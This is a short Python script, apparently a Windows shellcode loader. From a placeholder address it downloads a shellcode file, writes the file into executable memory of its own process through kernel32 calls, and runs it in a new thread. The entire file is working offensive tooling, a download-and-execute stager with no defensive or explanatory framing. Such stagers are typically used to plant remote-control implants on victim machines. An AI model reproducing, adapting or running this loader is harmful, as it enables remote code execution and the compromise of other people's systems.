import ctypes
import threading
from ctypes import wintypes
import urllib.request

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

SHELLCODE_URL = "http://ip:port/shellcode.bin"
with urllib.request.urlopen(SHELLCODE_URL) as response:
    buf = response.read()

# Define functions from kernerl32.dll
kernel32 = ctypes.windll.kernel32
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

def ThreadFunction(lpParameter):
    current_process = kernel32.GetCurrentProcess()

    # Allocate memory with `VirtualAllocEx`
    sc_memory = kernel32.VirtualAllocEx(current_process, None, len(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    bytes_written = ctypes.c_size_t(0)

    # Copy raw shellcode with `WriteProcessMemory`
    kernel32.WriteProcessMemory(current_process, sc_memory,ctypes.c_char_p(buf),len(buf),ctypes.byref(bytes_written))

    # Execute shellcode in memory by casting the address to a function pointer with `CFUNCTYPE`
    shell_func = ctypes.CFUNCTYPE(None)(sc_memory)
    shell_func()

    return 1

def Run():
    thread = threading.Thread(target=ThreadFunction, args=(None,))
    thread.start()

if __name__ == "__main__":
    Run()